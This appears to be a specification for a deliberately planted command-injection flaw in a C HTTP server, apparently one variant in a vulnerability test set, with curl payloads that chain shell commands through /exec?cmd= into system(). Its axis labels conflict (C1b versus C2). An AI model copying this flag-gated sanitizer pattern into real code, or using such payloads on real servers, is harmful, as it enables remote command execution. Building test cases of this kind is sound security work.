AXES:        C1b I2 S3

DESCRIPTION:
  Two-flag config-struct-gated command injection with a flag-gated sanitizer.
  The server must be started with --exec-mode (stored in struct server_config)
  for the /exec endpoint to be reachable. Input is copied via snprintf() into a
  local buffer before being passed to system(). A sanitization check (S3) exists
  but is only active when a third flag (--safe-mode) is passed; omitting it
  bypasses all filtering.

CONFIG_GATE (C2 — two flags + struct):
  mechanism:  CLI flags --exec-mode and --safe-mode; stored in
              struct server_config { int exec_enabled; int safe_mode; }
  check:      exec_handler() guards on srv_cfg.exec_enabled
  complexity: two fields parsed into one struct; gate checks only exec_enabled

INPUT_FLOW (I2 — snprintf buffer then system()):
  entry:      HTTP GET /exec?cmd=<payload>  →  onion_request_get_query(req, "cmd")
  path:       exec_handler() reads cmd; (optionally checks S3); copies into
              char cmdbuf[1024] via snprintf(cmdbuf, sizeof(cmdbuf), "%s", cmd);
              then calls system(cmdbuf)
  transforms: snprintf copy — functionally equivalent to raw cmd for exploits;
              does not truncate typical payloads within 1024 bytes

SANITIZATION (S3 — flag-gated check):
  mechanism:  `if (srv_cfg.safe_mode) { check for ; | & ` }` — only runs when
              --safe-mode is passed at startup
  bypass:     start the server WITHOUT --safe-mode; the entire if-block is skipped,
              all shell metacharacters (;, |, &, backtick, $) pass through freely
  note:       even with --safe-mode the snprintf buffer itself is not a defence;
              it's a cosmetic copy before system()

SINK:        system(cmdbuf) in exec_handler() (server.c)

CHANGED FILES:
  server.c — 4 hunks:
    1. server_config struct + srv_cfg global:  added after exec_mode global
    2. exec_handler() comment:                 updated to reflect C2 I2 S3 axes
    3. exec_handler() body:                    S3 flag-gated check + snprintf + system()
    4. main() arg parsing:                     --safe-mode sets srv_cfg.safe_mode

EXPLOIT:
  build:   bash build.sh
  start:   ./onion_server --port 18095 --exec-mode          # NO --safe-mode
  trigger: curl 'http://127.0.0.1:18095/exec?cmd=id>/tmp/poc_095_marker'
  verify:  cat /tmp/poc_095_marker
  expect:  uid=... line written by the server process

  S3 bypass demo (without --safe-mode):
    curl 'http://127.0.0.1:18095/exec?cmd=id%3Bid>/tmp/poc_095_marker'
    semicolon injection works because the check block is never reached

  gate bypass: omitting --exec-mode causes exec_handler() to return 404.

